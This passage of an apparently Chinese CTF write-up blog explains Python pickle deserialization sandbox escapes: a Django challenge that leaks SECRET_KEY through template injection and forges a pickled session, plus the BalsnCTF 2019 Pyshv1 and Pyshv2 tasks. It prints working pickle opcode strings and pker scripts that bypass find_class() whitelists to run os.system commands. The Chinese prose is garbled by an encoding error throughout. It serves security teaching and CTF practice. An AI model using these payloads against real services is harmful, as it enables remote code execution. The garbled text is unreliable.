&lt;p>ç”¨äº†ç‰¹æ®Šçš„SESSION_ENGINEå’ŒSESSION_SERIALIZERï¼Œå‰è€…æŒ‡çš„æ˜¯djangoå°†ç”¨æˆ·è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨å“ªé‡Œ åè€…æŒ‡djangoç”¨ä»€ä¹ˆæ–¹å¼å­˜å‚¨è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±ç›¸å½“äºå…ˆç»è¿‡SESSION_SERIAZLIZERæŒ‡å®šçš„æ–¹å¼è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå†æœ‰SESSION_ENGINEæŒ‡å®šçš„æ–¹å¼å­˜å‚¨åˆ°æŸä¸ªåœ°æ–¹ã€‚é»˜è®¤çš„djangoé¡¹ç›®ä¸­ï¼Œå­˜å‚¨ä½ç½®åº”è¯¥æ˜¯django.contrib.sessions.backends.dbï¼Œåºåˆ—åŒ–æ–¹å¼åº”è¯¥æ˜¯django.contrib.sessions.serializers.JSONSerializerï¼›è€Œè¿™é‡Œå°±æ˜¯ç”¨pickleåºåˆ—åŒ–åçš„å½¢å¼ï¼ŒåŠ ç­¾åsingedåå­˜å‚¨åœ¨cookieä¸­ã€‚é‚£è¿™é‡Œè‚¯å®šè¦æ§åˆ¶sessionï¼Œç»“åˆpickleæ¥rceäº†ï¼›è·Ÿè¿‡å»çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>ä¾æ—§æ˜¯é‡å†™äº†&lt;code>find_class()&lt;/code>æ–¹æ³•ï¼Œåªæœ‰æ¨¡å—æ˜¯å†…ç½®çš„builtinsï¼ˆä¸éœ€è¦importå°±å¯ä»¥ç”¨çš„ï¼‰å¹¶ä¸”åå­—ä¸èƒ½åœ¨é»‘åå•ä¸­æ‰å¯ä»¥ï¼›è¿™é‡Œçš„ç»•è¿‡æ˜¯ç¬¬äºŒä¸ªè€ƒç‚¹äº†ï¼Œå…ˆç¿»å›å»çœ‹ä¸€ä¸‹ä»…æœ‰çš„appçš„views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>æ¨¡æ¿éƒ¨åˆ†ç›´æ¥æ‹¼æ¥äº†request.user.usernameï¼Œè¿™æ˜¯æ³¨å†Œæ—¶ä¼ å…¥ï¼Œæœ‰æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæ‰¾æ‰¾è°ƒç”¨é“¾&lt;/p>
&lt;p>ï¼ˆå› ä¸ºæœ¬åœ°ç¯å¢ƒå¤ªåƒåœ¾äº† æ²¡å¤ç° è¿™é‡Œäº‘åšé¢˜äº†ï¼‰åœ¨æ¨¡æ¿å¤„ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šçš„ä¸Šä¸‹æ–‡å˜é‡ï¼Œé€šå¸¸ä¼šå­˜åœ¨çš„æœ‰request, user, permsï¼Œè¿™é‡Œç”¨çš„åˆ©ç”¨é“¾æ˜¯ï¼ˆæ³¨æ„djangoæ¨¡æ¿å¼•æ“æ— æ³•è¯»å–ä¸‹åˆ’çº¿å¼€å¤´çš„å±æ€§ï¼‰&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>ï¼Œæ³¨å†Œä¸€ä¸ªåä¸ºè¿™ä¸ªçš„ç”¨æˆ·å³å¯è·å¾—ç­¾åçš„å¯†é’¥ã€‚&lt;/p>
&lt;p>å†æ‰å¤´å›å»æ€è€ƒopcodeçš„ç¼–å†™ã€‚é‡å†™&lt;code>find_class()&lt;/code>ä¹‹åé™åˆ¶å¾ˆå¤šï¼Œä½†é€šè¿‡builtinsä»ç„¶å¯ä»¥ç”¨&lt;code>getattr()&lt;/code>ï¼›é‚£ä¹ˆå°±åˆ†ä¸¤æ­¥èµ°ï¼Œå…ˆé€šè¿‡&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>æ¥è·å–&lt;code>eval()&lt;/code>ï¼Œå†æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆå¦‚ä½•æ‰‹å†™protocol=0çš„opcodeæï¼Ÿ&lt;/p>
&lt;p>é¦–å…ˆå¼•å…¥æ¨¡å—builtinså’Œå‡½æ•°getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åéœ€è¦è·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç”¨globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>globalsæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥è¿˜è¦è·å–dictè¿™ä¸ªå¯¹è±¡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿˜è¦æ‰§è¡Œglobals()è·å–å®Œæ•´ä¸Šä¸‹æ–‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ ˆé¡¶å…ƒç´ æ˜¯builtins.globalsï¼Œå‹å…¥ä¸€ä¸ªç©ºå…ƒç»„&lt;code>(t&lt;/code>ï¼Œç„¶åç”¨&lt;code>R&lt;/code>æ‰§è¡Œ&lt;/p>
&lt;p>ç„¶åç”¨dict.get()æ–¹æ³•ä»globalsçš„å­—å…¸ä¸­æ‹¿åˆ°é”®åä¸ºbuiltionsçš„å€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ååºåˆ—åŒ–åå¾—åˆ°builtinså¯¹è±¡&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>ï¼›ä¹‹åå†ç”¨getatträ»builtinså¯¹è±¡ä¸­å–å‡ºevalï¼Œä¹Ÿå°±æ˜¯å†å¥—ä¸€å±‚å¨ƒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>ç°åœ¨å·²ç»æ‹¿åˆ°äº†evalå¯¹è±¡ï¼Œå†æ‰§è¡Œä»£ç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>æˆåŠŸæ‰§è¡Œä»£ç ï¼ˆæ³¨æ„è¿è¡Œæ—¶ä¸ä»…éœ€è¦å¼•å…¥pickle ä¹Ÿè¦å¼•å…¥builtinsæ‰å¯ä»¥ï¼ï¼‰&lt;/p>
&lt;p>â€”â€”â€”â€”ç”¨pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å‚è€ƒï¼š&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®±&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥sysæ¨¡å—åå­—ä¸­ä¸å¸¦ç‚¹å·">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥&lt;code>sys&lt;/code>æ¨¡å—&amp;amp;åå­—ä¸­ä¸å¸¦&lt;code>.&lt;/code>ç‚¹å·&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®ç¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
&lt;p>å®¡è®¡ä¸€ä¸‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹è‚¯å®šä¼šä¸secureçš„securePickle.oy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811212055295.png" alt="image-20210811212055295">&lt;/p>
&lt;p>é‡å†™&lt;code>find_class()&lt;/code>ï¼Œè¢«è°ƒç”¨æ—¶å¯ä»¥çµæ´»æ·»åŠ ç™½åå•ï¼›å†çœ‹çœ‹server.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811211736904.png" alt="image-20210811211736904">&lt;/p>
&lt;p>å°†è¾“å…¥çš„å†…å®¹å…ˆè½¬ä¸ºasciiç å½¢å¼è¢«b64åŠ å¯†ï¼Œå†ååºåˆ—åŒ–å‡ºæ¥ï¼›å…¶ä¸­ç™½åå•æ˜¯sysæ¨¡å—&lt;/p>
&lt;p>ä½†æ˜¯è¿™ä¸ªsysæ¨¡å—å¹¶ä¸å®‰å…¨ï¼šsysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡sys.modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¼•å…¥çš„æ‰€æœ‰æ¨¡å—(a cache of imported modules) ï¼Œå¦‚æœå®ƒè¢«æ”¹å˜ å¼•å…¥çš„æ¨¡å—å°±ä¼šè¢«æ”¹å˜ã€‚è€Œå®ƒä¹ŸåŒ…æ‹¬sysæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒ&lt;code>sys.modules['sys']=sys.modules&lt;/code>ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å…ˆä»sysä¸­å¼•å…¥modules: &lt;code>import modules from sys&lt;/code>ï¼Œç„¶åå°†&lt;code>modules['sys']&lt;/code>æ”¹ä¸º&lt;code>modules['os']&lt;/code>å°±å°†æˆåŠŸå¼•å…¥osæ¨¡å—ã€‚&lt;/p>
&lt;p>ä½†æœ‰ä¸ªç¼ºé™·æ˜¯modulesä¸ºdictï¼Œéœ€è¦ç”¨&lt;code>getattr(sys.modules[module], name)&lt;/code>è¿›è¡Œå–å€¼ï¼Œä¹Ÿå°±æ˜¯å…ˆå–å‡ºmodulesä¸­çš„getå‡½æ•°ï¼Œç„¶åå†ç”¨getæ¥å–å‡ºosï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹&lt;/p>
&lt;p>pker&lt;/p>
&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
modules['sys']=modules
modules_get=GLOBAL('sys', 'get')
os=modules_get('os')
modules['sys']=os
system=GLOBAL('sys', 'system')
system('dir')
return
&lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
&lt;/details>
&lt;h3 id="--ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—">&amp;ndash;&amp;raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å—&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­6 - [BalsnCTF 2019] Pyshv2
&lt;/h4>
&lt;/summary>
&lt;p>é¢˜ç›®ç¯å¢ƒ-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2&lt;/p>
&lt;p>&lt;code>find_class()&lt;/code>ç¨æœ‰åŒºåˆ«ï¼Œåœ¨&lt;code>getattr()&lt;/code>ä¹‹å‰å…ˆç”¨äº†&lt;code>__import__()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220348086.png" alt="image-20210811220348086">&lt;/p>
&lt;p>è¿™æ¬¡çš„ç™½åå•æ˜¯&lt;code>structs&lt;/code>ï¼Œç„¶é¹…è¿™æ˜¯ä¸ªç©ºçš„æ¨¡å— è™šæ™ƒä¸€æªã€‚ä¸è¿‡æ˜¯ç©ºçš„ä¸è¦ç´§ï¼Œç…§æ ·æœ‰å†…ç½®æ–¹æ³•ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811220801646.png" alt="image-20210811220801646">&lt;/p>
&lt;p>&lt;code>__builtins__&lt;/code>æ˜¯æ‰€æœ‰æ¨¡å—å…¬æœ‰çš„å­—å…¸ï¼Œè®°å½•æ‰€æœ‰çš„å†…å»ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¹&lt;code>__builtins__&lt;/code>å†…ç›¸åº”çš„é”®æ¥ä¿®æ”¹å¯¹åº”çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†evalæ–¹æ³•ï¼Œä½†å–å‡ºevalè¿™ä¸ªé”®å¦å¤–éœ€è¦ä¸€ä¸ªgetæ–¹æ³•æ‰èƒ½åšåˆ°ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œ&lt;code>__getattribute__&lt;/code>é­”æœ¯æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„å±æ€§ã€‚è€ŒåŒæ—¶&lt;code>__import__&lt;/code>å¹¶ä¸æ˜¯é“æ¿ä¸€å—ï¼Œå®ƒçš„å…¨éƒ¨å‚æ•°æ˜¯&lt;code>__import__(name, globals=None, locals=None, fromlist=(), level=0)&lt;/code>ï¼Œå®ƒå¯ä»¥è¢«æ›¿æ¢ï¼ˆé€šè¿‡å¯¼å…¥builtinsæ¨¡å—å¹¶èµ‹å€¼ç»™&lt;code>builtins.__import__&lt;/code>ï¼‰æ¥å¯ä»¥ä¿®æ”¹importè¯­å¥çš„è¯­ä¹‰å¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œè€Œé¢˜ç›®ä¸­é‡å†™çš„find_class()ç‰¹åœ°åœ¨getattr()ä¹‹å‰è°ƒç”¨äº†&lt;code>__import__&lt;/code>ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ª__import__ï¼Œè®©å®ƒå˜ä¸º&lt;code>__getattribute__&lt;/code>ï¼Œè®©æˆ‘ä»¬å¼•å…¥çš„structså˜ä¸º&lt;code>structs.__getattribute__(structs).xxx&lt;/code>ã€‚&lt;/p>
&lt;p>å¯¹äºå¼•å…¥æ¨¡å—çš„æ£€æŸ¥åªä¼šå‡ºç°åœ¨b&amp;rsquo;c&amp;rsquo;æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”¨&lt;code>S&lt;/code>æ“ä½œç åŠ«æŒ&lt;code>__import__&lt;/code>æ—¶å¹¶ä¸ä¼šå¼•å‘find_class()çš„è¿‡æ»¤ã€‚&lt;/p>
&lt;p>ç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥getattr()=getattr()è¿™æ ·è¦†ç›–&lt;code>__import__&lt;/code>ï¼Œæˆ‘ä»¬è¿˜éœ€è¦&lt;code>__dict__&lt;/code>çš„å¸®å¿™ã€‚&lt;code>__dict__&lt;/code>æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å¹¶å†³å®šäº†ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚æœå®ƒçš„å†…å®¹è¢«æ”¹å˜ï¼Œå±æ€§ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚&lt;/p>
&lt;p>æ‰€ä»¥æ•´åˆä¸€ä¸‹ä¸Šé¢çš„æ€è·¯ï¼šæˆ‘ä»¬å…ˆè¦å¼•å…¥åŠ©æ‰‹list&lt;code>structs.__dict__&lt;/code>ï¼Œå–å‡ºstructsç©ºæ¨¡å—çš„å†…å»ºå‡½æ•°ï¼ˆä¸€ä¸ªå¾…å–çš„dictï¼‰&lt;code>structs.__builtins__&lt;/code>å’Œæˆ‘ä»¬éœ€è¦çš„é­”æœ¯æ–¹æ³•&lt;code>structs.__getattribute__&lt;/code>ã€‚ä¹‹åä»å†…å»ºå‡½æ•°&lt;code>structs.__builtins__&lt;/code>ä¸­å°†é”®åä¸º&lt;code>__import__&lt;/code>çš„å€¼æ›¿æ¢ä¸º&lt;code>structs.__getattribute__&lt;/code>ï¼Œç„¶åå€ŸåŠ©&lt;code>__dict__&lt;/code>å°†structsçš„structså±æ€§è¦†ç›–ä¸ºä¿®æ”¹åçš„å†…å»ºå‡½æ•°ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”¨b&amp;rsquo;c&amp;rsquo;ä»structsä¸­å¼•å…¥getæ—¶è§¦å‘find_class()ä¸­çš„&lt;code>__import__&lt;/code>ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨æ‰§è¡Œ&lt;code>structs.__getattribute__('structs').get&lt;/code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†getæ–¹æ³•ã€‚è€Œä¹‹å‰æˆ‘ä»¬åˆå·²ç»æ›¿æ¢äº†structså±æ€§ä¸ºå†…å»ºå‡½æ•°&lt;code>__builtins__&lt;/code>ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°çš„getæ–¹æ³•å°±å¯ä»¥ä»&lt;code>__builtins__&lt;/code>ä¸­å–å‡ºevalï¼Œæ‰§è¡Œä»£ç äº†ã€‚ä¹‹åæ‰§è¡Œä»£ç çš„éƒ¨åˆ†åŒä¸Šé¢çš„sys.modulesçš„æ€è·¯ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">__dict__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__dict__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">gtat&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__getattribute__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">gtat&lt;/span>
&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">__builtins__&lt;/span>
&lt;span style="color:#111">builtin_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builtin_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
